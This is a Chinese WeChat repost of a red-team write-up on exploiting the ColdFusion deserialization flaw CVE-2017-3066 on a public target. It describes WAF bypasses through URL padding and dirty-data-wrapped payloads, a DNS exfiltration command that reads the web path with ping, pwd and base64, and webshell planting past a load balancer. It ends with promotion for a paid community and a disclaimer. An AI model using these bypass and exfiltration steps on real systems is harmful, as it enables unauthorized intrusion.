#  coldfusion反序列化过waf改exp拿靶标的艰难过程

[ 极梦C ](javascript:void\(0\);)

**极梦C** ![]()

微信号 gh_2353880ae4d9

功能介绍 只专注于实战的实战派。

____

___发表于_

收录于合集

以下文章来源于ABC123安全研究实验室 ，作者abc123info

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6fmEcY2bcaelEq3UFVKWcPX4siaYoqKZHfc2DgtHsekRw/0)
**ABC123安全研究实验室** .

ABC_123，2008年入行网络安全，某部委网络安保工作优秀个人，某市局特聘网络安全专家，某高校外聘讲师，某攻防实验室创始人。Struts2检测工具及Weblogic
T3/IIOP反序列化工具原创作者，擅长红队攻防，代码审计，内网渗透。

**  Part1 前言 **

本期分享一个有关Java反序列化漏洞的过waf案例。目标应用系统是Adobe
ColdFusion动态web服务器，对应的漏洞编号是CVE-2017-3066，曾经利用这个反序列化漏洞多次拿过权限。靶标直接放在公网上，网站部署了waf，而且这个waf可以识别反序列化攻击数据包，我当时费时两三天的时间，绕过了层层防护，过了一个又一个关卡，最终成功getshell，过程是非常艰辛的。

 **  Part2 技术研究过程 **

  *  **第1个坑，绕waf第一关**

Waf首先对url的攻击路径做了拦截，通过扫目录扫出一个 **/flex2gateway/amf**
这个文件路径，一看就知道大概率存在coldfusion反序列化漏洞，居然直接放在外网靶标的网站根目录下。别高兴地太早，经过测试，只要使用POST请求访问这个/flex2gateway/amf路径，就会被waf拦截掉。说明在POST请求下，waf识别了这个路径，遇到这个路径就认为是攻击行为，所以给拦截掉。接下来看绕过方法：

将URL路径/flex2gateway/amf 转成：

http://www.xxx.com//////////////////////////////////////////flex2gateway///////////////////////////////amf

（//////字符串是很长的，比上述要长很多，为了避免占用文章太多篇幅，我就不贴出来完整的了）

结果还是被waf拦截了。接下再继续加超大字符串，看如下操作：

http://www.xxx.com//////////////////////////////////////////flex2gateway///////////////////////////////amf?abc123=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

Ok，我们成功绕过了waf设备对url路径的检测。

![]()

  *  **第2个坑，个别脚本会造成网站崩溃**

对于这个漏洞的利用，之前都是使用cf_blazeds_des.py这个脚本，但是大家使用时需要特别注意，这个脚本通过sun.rmi.server.UnicastRef类实现对反序列化漏洞的利用，前提是服务器必须得出网，我最近2年遇到的coldfusion反序列化漏洞，能出网直接反弹shell的情况越来越少了，而且顶多是dns能出。然后还有一个巨坑，
**使用这个脚本需要提前做好功课，一次发包就利用成功，否则发个3、5次数据包，应用程序必然会挂掉** 。所以，这个脚本我几乎不用，除非万不得已。

![]()

  *  **第3个坑，ColdFusionPwn工具融合**

接下来需要寻找对这个漏洞的不出网的利用方法，在github上各种搜索之后，发现ColdFusionPwn这个工具看起来不错，也是java写的，遇到问题我自己可以魔改一下。谁知道真正使用这个工具的时候，一直报错，提示无法加载主类。之前还是能正常使用的，今天却用不了了，不知道问题出在哪里。

![]()

从工具的使用说明上看，ColdFusionPwn这个工具需要依赖于ysoserial这个jar包。干脆我下载了作者的java代码，使用Intellij
Idea导入到ysoserial中，把代码流程稍微改了一下，这下子可以自己正常生成payload了，-s与-
e是ColdFusionPwn工具的两种不同的payload生成模式，说白了，就是漏洞的利用方法不同，实测的时候都可以用一下。

![]()

  *  **第4个坑，绕waf第2关**

使用上一步的代码生成payload之后，将payload导入burpsuite的Repeater功能中，把数据包发送出去，结果发现waf又对post包体进行了拦截，点击“发送”按钮，waf会直接把数据包丢掉，迅速返回空。

![]()

接下来经过一系列测试与判断，发现waf设备对超大数据包会放行，如下图所示，waf设备不拦截。

![]()

但是这样直接在反序列化的字节数据前添加脏数据，是肯定不行的，因为无法触发反序列化攻击代码。
**接下来想起了之前的同事“回忆飘如雪”的Java反序列化添加脏数据的文章**
，于是我下载了他的java代码，经过一顿折腾，把作者写的DirtyDataWrapper类融合到自己的ysoserial里面去，实现对ColdFusionPwn生成的反序列化数据包的参杂脏数据的改造。

![]()

最终生成攻击代码如下图所示：

![]()

  *  **第5个坑，过waf第3关**

继续看上述截图，实测发现还是被WAF拦截了，不知道问题出在哪里。最终经过大量的测试分析，发现只要POST数据包中包含java.util.LinkedList类关键字，waf直接会把数据包丢弃掉。ε=(´ο｀*)))唉，真是太难了。接下来看看“回忆飘如雪”的java代码怎么写的，想把它改造一下。最终我找到了一个简单的解决办法，
**将他的DirtyDataWrapper类代码中的type值恒等于0**
，这样生成的脏数据包，就不包含被waf拦截的敏感类了。具体为什么这么改，这里就不叙述了，大家可以自己从github上搜索相关代码，自己分析一下。

![]()

最终生成的payload，完美绕过waf。

![]()

  *  **第6个坑，ysoserial执行命令**

接下来要想办法拿shell、拿靶标，很遗憾服务器是不出网的，没法直接反弹shell。经过测试，得出结论：TCP不出网，但是DNS能出。于是我就想了一个办法，通过DNSlog把web路径一点点读出来，如果一个字节一个字节读太慢，可以结合linux命令一段一段的读出来，然后向这个web路径下写入一个webshell即可。

但是最后新问题又来了，在实战过程中，URLDNS这个利用链能出网，但是ping
xxx.dnslog.cn怎么弄都不出网。。。通过dns读取操作系统名，发现目标服务器是linux。最终我本地搭建了一个coldfusion环境，经过一系列测试，我发现问题出在ysoserial的Gadgets类的执行命令过程中。

注，对于本次测试案例，我变化了各种执行命令的写法， **经过大量的试验，必须按照如下图所示的代码写法，才能执行命令成功**
。第一次遇到这种情况，其它的各种写法都不行，实践的结论就是这样，真是太难了。

![]()

  *  **第7个坑，dnslog长度限制**

接下来就可以通过DNSLOG读web路径了，只要拿到web路径，就可以直接写shell拿到权限了，但结果发现dnslog怎么都收不到路径结果。后来我想明白了，DNSlog是有长度限制的，肯定是目标服务器的web路径太长了。于是，我经过测试，结合linux自带的系统目录sed与cut，给出如下一段一段读网站绝对路径的方法。哈哈，分享给大家了。

ping `pwd|base64|sed -n '1p'|cut -c 1-60ping `pwd|base64|sed -n '1p'|cut -c
61-80

最好用burp的Collaborator
client功能，非常好用很稳定，如果用dnslog的话，很多时候浏览器卡了一下，dnslog就再也看不到dnslog信息了，就得变换域名，非常麻烦。实战中会出现各种莫名其妙的问题，后来拿到shell之后，发现是负载均衡的问题。。。

![]()

  *  **第8个坑，负载均衡**

写入webshell之后，发现shell访问不到了，难道被删除了？突然我拍了下腿，我的天，这个站竟然还有负载均衡！难怪前期测试漏洞时总是会出现一些莫名其妙的问题。。。于是我开启了burpsuite的intruder功能，将写shell的payload发包了几百次，之后访问webshell的成功率大大提高了。。。对于负载均衡，我没有什么好的解决办法，添加cookie的方法也不能用。

![]()

这个案例其实遇到的坑比上述还多，还有很多曲折的地方，但是时间间隔有点长，很多地方也想不起来了，但是关键点就是以上部分，欢迎大家勘误指正，给我发消息提意见。

 **  Part3 总结 **

 **1.   **对于反序列化漏洞的利用，很多时候都得将exp改一改，以适应各种环境。

 **2.   **多搭建环境，避免走入死胡同。

 **3.** 引用“回忆飘如雪”的文章： https://gv7.me/articles/2021/java-deserialize-data-
bypass-waf-by-adding-a-lot-of-dirty-data/

 ![]()

  
  
  
  
  
  
 **星球内容**

正式运营星球:

1.src真实漏洞挖掘案例分享(永久不定时更新),过程详细一看就会哦。  
2.自研/二开等工具/平台的分享。  
3.漏洞分析/资料共享等。  

  
  
  
  
  
  
  
  
  
  
  

![]()

  

![]()

  

![]()

  

  

  

![]()

  

  
  

![]()

  

  

![]()

  

  

  
  
  
  
  
  

 **ps:漏洞都是加班加点挖到的,最近白嫖的人日益增多越来越多。  
白嫖党过多,增加了新人阅读权限,3天就解除。**

  
  
  
  

  

  
  
  
  
  
  

关于文章/Tools获取方式:请关注交流群或者知识星球。

  

  

  

  

  
  
  
  
  
  

关于交流群：因为某些原因，更改一下交流群的获取方式:

1.请点击联系我们->联系官方->客服小助手添加二维码拉群 。  

![]()

  

  

  

  

  
  

关于知识星球的获取方式:

1.后台回复发送 "知识星球"，即可获取知识星球二维码。

2如若上述方式不行，请点击联系我们->联系官方->客服小助手添加二维码进入星球 。  

3.为了提高质量,推出"免费名人堂"名额,后台回复发送 "知识星球"了解详情。

![]()

  

  

  

  

  

  

  

免责声明

  

          

  

本公众号文章以技术分享学习为目的。

由于传播、利用本公众号发布文章而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任。

一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

  

  

  

  

![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

